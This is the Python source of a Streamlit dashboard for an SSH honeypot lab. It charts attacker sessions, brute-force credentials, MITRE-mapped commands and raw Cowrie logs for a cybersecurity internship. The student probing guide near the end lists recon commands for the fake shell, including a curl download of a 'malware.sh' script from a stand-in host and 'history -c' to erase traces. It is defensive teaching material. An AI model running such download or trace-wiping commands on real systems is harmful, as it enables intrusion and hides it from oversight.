"""
Enterprise SSH Honeypot SOC & Threat Intelligence Center.
Dark/Black theme designed for cybersecurity operations, student learning,
forensic analysis, keystroke-by-keystroke telemetry, and raw log inspection.
"""

import json
import os
import sqlite3
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import streamlit as st
from dotenv import load_dotenv

load_dotenv()
DB_PATH = os.getenv("DATABASE_PATH", "data/honeypot.db")

st.set_page_config(
    page_title="SSH Honeypot Threat Intel & Forensic SOC",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Dark / Black SOC Theme CSS
st.markdown("""
<style>
    /* Dark app background */
    .stApp {
        background-color: #0b0f19;
        color: #e2e8f0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    /* Metric cards */
    .soc-card {
        background-color: #161f30;
        border: 1px solid #243048;
        border-radius: 8px;
        padding: 16px;
        box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3);
        margin-bottom: 12px;
    }
    .soc-card-title {
        font-size: 13px;
        font-weight: 600;
        text-transform: uppercase;
        color: #94a3b8;
        letter-spacing: 0.05em;
        margin-bottom: 4px;
    }
    .soc-card-value {
        font-size: 26px;
        font-weight: 700;
        color: #38bdf8;
    }
    .soc-card-sub {
        font-size: 12px;
        color: #64748b;
        margin-top: 4px;
    }

    /* Forensic path info banner */
    .path-banner {
        background-color: #131b2e;
        border-left: 4px solid #38bdf8;
        border-top: 1px solid #243048;
        border-right: 1px solid #243048;
        border-bottom: 1px solid #243048;
        border-radius: 6px;
        padding: 14px 18px;
        margin-bottom: 20px;
    }

    /* Raw code log box */
    .raw-log-box {
        background-color: #0f172a;
        border: 1px solid #334155;
        border-radius: 6px;
        padding: 10px;
        font-family: "Courier New", Courier, monospace;
        font-size: 12px;
        color: #38bdf8;
        overflow-x: auto;
    }
</style>
""", unsafe_allow_html=True)


def get_connection():
    if not os.path.exists(DB_PATH):
        return None
    return sqlite3.connect(DB_PATH, check_same_thread=False)


# Sidebar Configuration
st.sidebar.title("🛡️ SOC Operations")
st.sidebar.caption("Enterprise Honeypot & Forensics")

auto_refresh = st.sidebar.checkbox("Auto-refresh (every 10s)", value=False)
st.sidebar.markdown("---")

st.sidebar.subheader("📡 Server Endpoints")
st.sidebar.markdown("""
* **Attacker Port**: `18.60.33.150:22`
* **Admin SSH**: `18.60.33.150:22222`
* **Dashboard Web**: `http://18.60.33.150`
""")

st.sidebar.markdown("---")
st.sidebar.subheader("Threat Intel Feed")
api_key_present = bool(os.getenv("ABUSEIPDB_API_KEY"))
st.sidebar.success("AbuseIPDB API: Active ✅" if api_key_present else "AbuseIPDB API: Missing ⚠️")
st.sidebar.caption("BCSSL Cybersecurity Internship — Lab 04")

conn = get_connection()

if conn is None:
    st.warning("Database initializing... No logs captured yet. Run an attack or wait for external traffic.")
    st.stop()

# --- TOP HEADER & EDUCATIONAL FILE PATH BANNER ---
st.title("🛡️ SSH Honeypot Threat Intelligence & Forensic Center")
st.caption("Live attacker capture, telemetry ingestion, MITRE ATT&CK mapping, and raw log forensics.")

st.markdown("""
<div class="path-banner">
    <strong style="color: #38bdf8;">📁 Forensic Evidence Storage Paths on Server (AWS EC2):</strong><br>
    <div style="font-size: 13px; color: #cbd5e1; margin-top: 6px; line-height: 1.6;">
        • <strong>Raw JSON Event Stream:</strong> <code>/home/ubuntu/ssh-honeypot/var/log/cowrie/cowrie.json</code> (Container: <code>/cowrie/var/log/cowrie/cowrie.json</code>)<br>
        • <strong>Interactive Keystroke TTY Playback:</strong> <code>/home/ubuntu/ssh-honeypot/var/lib/cowrie/tty/</code> (Play with: <code>bin/playlog &lt;file.log&gt;</code>)<br>
        • <strong>Captured Malware Droppers:</strong> <code>/home/ubuntu/ssh-honeypot/var/lib/cowrie/downloads/</code> (SHA-256 indexed payloads)<br>
        • <strong>SOC SQLite Database:</strong> <code>/home/ubuntu/ssh-honeypot/data/honeypot.db</code>
    </div>
</div>
""", unsafe_allow_html=True)

# --- SUMMARY KPI CARDS ---
cur = conn.cursor()
try:
    total_sessions = cur.execute("SELECT count(*) FROM sessions").fetchone()[0]
    unique_ips = cur.execute("SELECT count(DISTINCT ip) FROM sessions").fetchone()[0]
    total_auth = cur.execute("SELECT count(*) FROM auth_attempts").fetchone()[0]
    success_auth = cur.execute("SELECT count(*) FROM auth_attempts WHERE status = 'SUCCESS'").fetchone()[0]
    total_cmds = cur.execute("SELECT count(*) FROM commands").fetchone()[0]
    total_countries = cur.execute("SELECT count(DISTINCT country) FROM sessions WHERE country IS NOT NULL AND country != 'Unknown' AND country != ''").fetchone()[0]
except Exception as e:
    st.error(f"Database query error: {e}")
    st.stop()

kpi1, kpi2, kpi3, kpi4, kpi5, kpi6 = st.columns(6)

with kpi1:
    st.markdown(f'<div class="soc-card"><div class="soc-card-title">Sessions</div><div class="soc-card-value">{total_sessions:,}</div><div class="soc-card-sub">Inbound probes</div></div>', unsafe_allow_html=True)
with kpi2:
    st.markdown(f'<div class="soc-card"><div class="soc-card-title">Attacker IPs</div><div class="soc-card-value">{unique_ips:,}</div><div class="soc-card-sub">Unique sources</div></div>', unsafe_allow_html=True)
with kpi3:
    st.markdown(f'<div class="soc-card"><div class="soc-card-title">Brute-Force</div><div class="soc-card-value">{total_auth:,}</div><div class="soc-card-sub">Password trials</div></div>', unsafe_allow_html=True)
with kpi4:
    st.markdown(f'<div class="soc-card"><div class="soc-card-title">Breached Shells</div><div class="soc-card-value" style="color: #f43f5e;">{success_auth:,}</div><div class="soc-card-sub">Fake shell access</div></div>', unsafe_allow_html=True)
with kpi5:
    st.markdown(f'<div class="soc-card"><div class="soc-card-title">Keystrokes</div><div class="soc-card-value" style="color: #38bdf8;">{total_cmds:,}</div><div class="soc-card-sub">Commands captured</div></div>', unsafe_allow_html=True)
with kpi6:
    st.markdown(f'<div class="soc-card"><div class="soc-card-title">Countries</div><div class="soc-card-value">{total_countries:,}</div><div class="soc-card-sub">Geolocations</div></div>', unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# --- ROW 1: ATTACK MAP & GEOLOCATION ---
st.subheader("🌍 Attacker Geolocation & Threat Reputation")

geo_df = pd.read_sql_query("""
    SELECT 
        s.ip, 
        s.country, 
        s.city, 
        s.asn, 
        s.abuse_score, 
        c.latitude, 
        c.longitude,
        COUNT(s.session_id) as attack_count
    FROM sessions s
    LEFT JOIN ip_cache c ON s.ip = c.ip
    WHERE c.latitude IS NOT NULL AND c.latitude != 0.0
    GROUP BY s.ip
""", conn)

col_map, col_country = st.columns([2.5, 1])

with col_map:
    if not geo_df.empty:
        fig_map = px.scatter_geo(
            geo_df,
            lat="latitude",
            lon="longitude",
            hover_name="ip",
            size="attack_count",
            color="abuse_score",
            color_continuous_scale="Reds",
            range_color=[0, 100],
            projection="natural earth",
            hover_data={"country": True, "city": True, "asn": True, "abuse_score": True, "attack_count": True},
            template="plotly_dark"
        )
        fig_map.update_geos(showcountries=True, countrycolor="#334155", showocean=True, oceancolor="#0f172a", bgcolor="#0b0f19")
        fig_map.update_layout(margin={"r": 0, "t": 20, "l": 0, "b": 0}, height=380, paper_bgcolor="#0b0f19")
        st.plotly_chart(fig_map, use_container_width=True)
    else:
        st.info("Waiting for geolocation coordinates...")

with col_country:
    country_df = pd.read_sql_query("""
        SELECT country, COUNT(*) as sessions 
        FROM sessions 
        WHERE country IS NOT NULL AND country != '' 
        GROUP BY country 
        ORDER BY sessions DESC 
        LIMIT 6
    """, conn)
    if not country_df.empty:
        fig_country = px.bar(
            country_df, 
            x="sessions", 
            y="country", 
            orientation="h",
            title="Top Attacker Nations",
            color="sessions",
            color_continuous_scale="Blues",
            template="plotly_dark"
        )
        fig_country.update_layout(yaxis={'categoryorder': 'total ascending'}, height=380, showlegend=False, margin={"t": 35, "b": 0}, paper_bgcolor="#0b0f19", plot_bgcolor="#0b0f19")
        st.plotly_chart(fig_country, use_container_width=True)
    else:
        st.caption("No country statistics yet.")

st.markdown("<br>", unsafe_allow_html=True)

# --- ROW 2: CREDENTIAL HARVEST & BRUTE-FORCE INTELLIGENCE ---
st.subheader("🔑 Authentication Telemetry & Password Harvest")

c_user, c_pass, c_pie = st.columns([1.5, 1.5, 1])

with c_user:
    user_df = pd.read_sql_query("""
        SELECT username, count(*) as count 
        FROM auth_attempts 
        WHERE username IS NOT NULL AND username != '' 
        GROUP BY username 
        ORDER BY count DESC 
        LIMIT 8
    """, conn)
    if not user_df.empty:
        fig_user = px.bar(user_df, x="username", y="count", title="Top Targeted Usernames", color="count",
                          color_continuous_scale="Tealgrn", template="plotly_dark")
        fig_user.update_layout(height=280, showlegend=False, margin={"t": 30, "b": 0}, paper_bgcolor="#0b0f19", plot_bgcolor="#0b0f19")
        st.plotly_chart(fig_user, use_container_width=True)
    else:
        st.caption("Waiting for auth data...")

with c_pass:
    pass_df = pd.read_sql_query("""
        SELECT password, count(*) as count 
        FROM auth_attempts 
        WHERE password IS NOT NULL AND password != '' 
        GROUP BY password 
        ORDER BY count DESC 
        LIMIT 8
    """, conn)
    if not pass_df.empty:
        fig_pass = px.bar(pass_df, x="password", y="count", title="Top Attempted Passwords", color="count",
                          color_continuous_scale="Purp", template="plotly_dark")
        fig_pass.update_layout(height=280, showlegend=False, margin={"t": 30, "b": 0}, paper_bgcolor="#0b0f19", plot_bgcolor="#0b0f19")
        st.plotly_chart(fig_pass, use_container_width=True)
    else:
        st.caption("Waiting for password data...")

with c_pie:
    ratio_df = pd.read_sql_query("""
        SELECT status, count(*) as count 
        FROM auth_attempts 
        GROUP BY status
    """, conn)
    if not ratio_df.empty:
        fig_ratio = px.pie(ratio_df, names="status", values="count", title="Login Ratios",
                           color="status", color_discrete_map={"FAILED": "#ef4444", "SUCCESS": "#10b981"},
                           hole=0.45, template="plotly_dark")
        fig_ratio.update_layout(height=280, margin={"t": 30, "b": 0}, paper_bgcolor="#0b0f19")
        st.plotly_chart(fig_ratio, use_container_width=True)
    else:
        st.caption("No auth ratios.")

st.markdown("<br>", unsafe_allow_html=True)

# --- ROW 3: MITRE ATT&CK & COMMAND FEED ---
st.subheader("🎯 MITRE ATT&CK Behavioral Mapping & Executed Commands")

m_col1, m_col2 = st.columns([1.2, 2.8])

with m_col1:
    mitre_df = pd.read_sql_query("""
        SELECT mitre_technique, mitre_id, count(*) as count 
        FROM commands 
        WHERE mitre_id IS NOT NULL 
        GROUP BY mitre_id 
        ORDER BY count DESC
    """, conn)
    if not mitre_df.empty:
        fig_m = px.bar(
            mitre_df,
            x="count",
            y="mitre_technique",
            orientation="h",
            color="count",
            color_continuous_scale="Oranges",
            title="Classified MITRE ATT&CK Techniques",
            hover_data={"mitre_id": True},
            template="plotly_dark"
        )
        fig_m.update_layout(yaxis={'categoryorder': 'total ascending'}, height=360, showlegend=False, margin={"t": 30, "b": 0}, paper_bgcolor="#0b0f19", plot_bgcolor="#0b0f19")
        st.plotly_chart(fig_m, use_container_width=True)
    else:
        st.info("No commands mapped to MITRE yet.")

with m_col2:
    recent_cmds = pd.read_sql_query("""
        SELECT timestamp, ip, command_text as "Command Executed", mitre_id as "Technique ID", mitre_technique as "Technique Name", mitre_tactic as "Tactic"
        FROM commands 
        ORDER BY id DESC 
        LIMIT 10
    """, conn)
    if not recent_cmds.empty:
        st.write("**Recent Shell Keystrokes & TTP Classification**")
        st.dataframe(recent_cmds, use_container_width=True, height=310)
    else:
        st.caption("No commands executed yet.")

st.markdown("<br>", unsafe_allow_html=True)

# --- ROW 4: FORENSIC DEEP-DIVE & RAW LOG TELEMETRY EXPLORER ---
st.subheader("🔍 Attacker Session Investigation & Raw Log Forensics")
st.markdown("Select any active or past session to inspect the **exact keystroke timeline** and the **underlying raw JSON logs** (`cowrie.json`).")

session_list = pd.read_sql_query("""
    SELECT s.session_id, s.ip, s.country, s.start_time, s.duration, s.abuse_score
    FROM sessions s 
    ORDER BY s.start_time DESC 
    LIMIT 50
""", conn)

if not session_list.empty:
    selected_session = st.selectbox(
        "Choose Session ID to Inspect:",
        options=session_list["session_id"].tolist(),
        format_func=lambda x: f"Session [{x}] — IP: {session_list.loc[session_list['session_id'] == x, 'ip'].values[0]} ({session_list.loc[session_list['session_id'] == x, 'country'].values[0] or 'Unknown'})"
    )

    if selected_session:
        s_meta = session_list[session_list["session_id"] == selected_session].iloc[0]
        
        info_c1, info_c2, info_c3, info_c4 = st.columns(4)
        info_c1.metric("Attacker IP", s_meta["ip"])
        info_c2.metric("Origin", s_meta["country"] or "Unknown")
        info_c3.metric("Duration", f"{s_meta['duration']:.1f}s")
        info_c4.metric("Abuse Confidence", f"{s_meta['abuse_score']}%")

        tab_keystrokes, tab_raw_json, tab_auth = st.tabs([
            "⌨️ Interactive Keystroke History", 
            "📄 Raw JSON Telemetry Log", 
            "🔐 Authentication Sequence"
        ])

        with tab_keystrokes:
            cmds = pd.read_sql_query("""
                SELECT timestamp, command_text, mitre_id, mitre_technique, mitre_tactic
                FROM commands 
                WHERE session_id = ? 
                ORDER BY id ASC
            """, conn, params=(selected_session,))
            if not cmds.empty:
                st.write("**Chronological Commands Typed by Attacker:**")
                st.dataframe(cmds, use_container_width=True)
            else:
                st.info("No shell commands executed in this session (authentication phase only).")

        with tab_raw_json:
            st.write("**Underlying Cowrie JSON Events (Raw Forensic Audit Trail):**")
            raw_logs = pd.read_sql_query("""
                SELECT timestamp, event_id, raw_json
                FROM raw_logs
                WHERE session_id = ? 
                ORDER BY id ASC
            """, conn, params=(selected_session,))

            if not raw_logs.empty:
                for idx, row in raw_logs.iterrows():
                    with st.expander(f"Event: {row['event_id']} — {row['timestamp']}"):
                        try:
                            parsed_json = json.loads(row['raw_json'])
                            st.json(parsed_json)
                        except Exception:
                            st.code(row['raw_json'], language="json")
            else:
                st.caption("Raw logs will populate for newly ingested sessions.")

        with tab_auth:
            auths = pd.read_sql_query("""
                SELECT timestamp, username, password, status
                FROM auth_attempts 
                WHERE session_id = ? 
                ORDER BY id ASC
            """, conn, params=(selected_session,))
            if not auths.empty:
                st.dataframe(auths, use_container_width=True)
            else:
                st.caption("No authentication records for this session.")

st.markdown("<br>", unsafe_allow_html=True)

# --- ROW 5: STUDENT HANDS-ON PROBING LAB ---
with st.expander("🧪 Student Hands-On Demonstration & Probing Guide", expanded=False):
    st.markdown("""
    ### How Students Can Probe & Test This Honeypot:
    1. **Open PowerShell or Terminal** on your computer.
    2. **Attempt an SSH Connection** to the Honeypot trap port:
       ```bash
       ssh -p 22 <your-name>@18.60.33.150
       ```
    3. **Try Passwords**:
       * Try wrong passwords to simulate brute forcing (e.g. `wrongpass`).
       * Try a known honey-credential (e.g. username: `root`, password: `root` or `123456`, or `admin`/`admin`).
    4. **Execute Recon Commands** inside the fake shell:
       ```bash
       uname -a
       whoami
       id
       cat /proc/cpuinfo
       ps aux
       curl -O http://example.com/malware.sh
       history -c
       exit
       ```
    5. **Inspect Your Results**: Refresh this dashboard and select your IP/Session above to see your exact keystrokes, IP reputation score, and raw JSON telemetry captured in real time!
    """)

# --- ROW 6: EXPORT EVIDENCE ---
st.markdown("<br>", unsafe_allow_html=True)
st.subheader("📥 Export Evidence for Lab Report")
exp_col1, exp_col2 = st.columns(2)

sessions_all = pd.read_sql_query("SELECT * FROM sessions", conn)
commands_all = pd.read_sql_query("SELECT * FROM commands", conn)

with exp_col1:
    st.download_button(
        label="Download Sessions & Geolocation CSV",
        data=sessions_all.to_csv(index=False).encode('utf-8'),
        file_name="honeypot_sessions_report.csv",
        mime="text/csv"
    )

with exp_col2:
    st.download_button(
        label="Download Keystrokes & MITRE Mapping CSV",
        data=commands_all.to_csv(index=False).encode('utf-8'),
        file_name="honeypot_commands_mitre.csv",
        mime="text/csv"
    )

if auto_refresh:
    import time
    time.sleep(10)
    st.rerun()
